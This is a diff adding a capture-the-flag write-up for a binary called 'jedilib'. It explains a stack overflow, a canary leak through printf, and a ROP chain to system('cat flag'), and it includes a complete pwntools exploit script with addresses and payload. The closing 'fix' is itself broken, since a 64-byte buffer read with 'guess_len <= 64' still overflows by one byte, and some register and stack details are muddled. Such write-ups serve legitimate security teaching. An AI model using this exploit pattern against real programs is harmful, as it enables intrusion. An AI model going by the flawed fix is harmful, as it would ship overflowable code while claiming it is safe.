@@ -1,0 +1,133 @@
+jedilib
+=======
+
+Overview
+--------
+For this challenge, the goal was to exploit the program *jedilib*. During the execution of the program, the user would have to *'use the Force'* to guess two numbers. Before the user would introduce their input, a random number would be generate and the number inputed would be compared with the number of the program. The same process would repeat itself. If the user guess both the numbers, the program would present the user with the hash value of the flag.
+
+Vulnerability
+-------------
+Firstly the program is susceptible to overflow, because the number of chars that can be read from the *stdin* in the function *read_my_mind* is bigger than the number of chars the buffer can store, i.e. *MAX_P_LEN* is bigger than the buffer size.
+
+```c
+ guess_len = 0;
+ 		while (guess_len <= MAX_P_LEN) {
+ 			guess[guess_len] = getchar();
+ 			if (guess[guess_len] == '\n')
+ 				break;
+ 			guess_len++;
+ 		}
+```
+
+This allows the user to overwrite values in the stack, and ultimately will allow the canary to be readable using *printf(%s)*.Consequently, the attacker will be able to read the canary, and reintroduce it in the stack and still be able to change the values that the canary was meant to protect.
+
+Exploitation
+------------
+Analising the code, we (Cláudia Silva e12135542 and myself) notice that there is no particular instructions than can lead us to the output we desire. Therefore, we need to create our sequence of instructions that can result on the discovery of the flag. 
+
+As the NX is enable, the input introduced will not be interpreted as executable, however, if we are able to change the values in the return address we can take control of the program and exploit it.
+
+To do so, first, we need to discover how many bytes it's necessary to write before reaching the canary. There are to approaches to it. The first one is analyzing the code assembly, locating the array *guess* in the position -0x50(%rbp) of stack and noticing the *canary* is stored in the position -0x8(%rbp). The other option is filling the array *guess* with padding and knowing that the *canary* starts with the \x00, counting the amount of bytes there are in between both of the variables. We discover that we need to write 72 bytes as padding before we reached the actual canary.
+
+The canary is a value that is determine in the begin of the execution, and verified in the end. It's expected that it keeps the same value. If this doesn't happen, an overflow has occored and the program will end. After discovering the amount of padding, we need to discover the value of the canary, so we can ovwerwrite it with the correct value and gain access to the return address and, consequently, realize our attack. 
+
+For that we took advantage of the print("%s") in the code. The function printf("%s") stops reading when it reaches the hex value "\x00". The canary's value starts with that hex value. However, we can overwrite it. As the program repeats itself twice, we can alter the value of the canary and afterwards restore it. By replacing the hex value '\00', the printf(%s) will read the other values of the canary. As we are on a *64-bit arquicteture*, the canary is writen in 8 bytes, being the first one the \x00. To realize this procedure, I wrote the following lines of code:
+
+<pre><code>
+    p.sendline(b'A'*72)
+    trash = p.recvline()
+    log.info(trash)
+    canary = p.recv(0x3)
+    log.info(canary)
+</code></pre>
+
+The canary is written in the stack after the saved previous %ebp and the saved %eip. In the arquitecture 64-bit, the registers are composed of 8 bytes. Therefore, as we are not particularly interested in changing the %ebp to any value, we can just use padding.
+
+In the stack after it, we have the saved %eip. The instruction that stands on that position, will be executed. This is were we start to build our *ROP*. 
+Our goal is to execute: *system("cat flag")* so we can consult the content of the flag we want to uncover.
+For that we need to defined a instruction that calls the function system of libc. Fortunatelly, this functions is used in the program itself, so we can discover its position on the PLT. We are using the positions of the functions on the PLT(Procedure Linkage Table) because the program is dynamically linked. Using gdb to consult the assembly of the code main, we can visualize this:
+
+>0x0000000000400c43 <+95>:   lea    0x224(%rip),%rdi        # 0x400e6e
+
+>0x0000000000400c4a <+102>:   callq  0x400860 <system@plt>
+
+>0x0000000000400c4f <+107>:   lea    0x230(%rip),%rdi        # 0x400e86
+
+>0x0000000000400c56 <+114>:   mov    $0x0,%eax
+
+>0x0000000000400c5b <+119>:   callq  0x400870 <printf@plt>
+
+>0x0000000000400c60 <+124>:   lea    0x236(%rip),%rdi        # 0x400e9d
+
+>0x0000000000400c67 <+131>:   mov    $0x0,%eax
+
+>0x0000000000400c6c <+136>:   callq  0x400870 <printf@plt>
+
+>0x0000000000400c71 <+141>:   lea    0x22e(%rip),%rdi        # 0x400ea6
+
+
+So, we can conclude that the address of the function system is:
+
+>system = 0x400860
+
+We must pass the string "cat flag" as the input of the previous function. This string is used in the function main of jebilib, which means we can find an address for it in the assembly code. Analising the code of the function *main* as well as the assembly previously presented, we can uncover its value. The string we looked for is the second string to be print out after the function *system* is invoke. It is important to recall that in 64-bit architectures, the input of function is kept in %rdi. With this knowledge, we can state that the string is in the position *0x400e9d*.
+
+As I mention, in the architeture that we are using, the arguments are passed in the register %rdi. So before calling the function *system*, we need to pop the register %rdi. In order to find an address for this instruction, we used ROPgadgets, and obtain the following address: 0x0000000000400c97.
+We all of this parts in consideration, and knowing how to pass content to function in 64-bit we can build the following payload: 
+
+>padding + canary + padding + pop_rdi + catflag + ret + system
+
+>b'A'*72 + canary + b'A'*8 + p64(pop_rdi) +p64(catflag) + p64(ret) + p64(system)
+
+And develop the following script:
+
+<pre><code>
+    from pwn import *
+
+    p = process('./jedilib')
+    p.clean()
+    
+    #first iteration (discover the canary)
+    p.sendline(b'A'*72)
+    trash1 = p.recvline() 
+    canary = p.recv(0x7)
+    trash2 = p.recv()
+    canary = b'\x00'+canary
+    log.info("canary value: 0x%s"% canary)
+    
+    #second iteration (write the payload)
+    system = 0x400860
+    catflag = 0x400e9d
+    pop_rdi = 0x0000000000400c97
+    ret = 0x0000000000400826
+    
+    payload = b'A'*72 + canary + b'A'*8 + p64(pop_rdi) + p64(catflag) + p64(ret)  + p64(system)
+    log.info(payload)
+    
+    p.sendline(payload) 
+    log.info(p.recv())
+    
+    p.interactive()
+
+</code></pre>
+
+Lastly, I must mention that we found it necessary to add a filler instruction, the operation *ret*, located in the address 0x0000000000400826, to allign the instructions. After executing this script, we were able to uncover the flag.
+
+Solution
+--------
+The solution for this vulnerabilitie should be adding restrictions to the size of the user's input. The user should not be allowed to write more chars than the amount the buffer is able to hold. If the attacker wasn't able to overwrite the first char of the canary, they would not be able to leak it and change the flow of the program so easily. Therefore, the following alterations to the code must be made. 
+
+<pre><code>
+    void read_my_mind(void){
+    // ...
+        char guess[64];
+    // ...
+        while (guess_len <= 64) {
+            guess[guess_len] = getchar();
+            if (guess[guess_len] == '\n')
+                break;
+            guess_len++;
+        }
+    // ...  
+    }
+</code></pre>
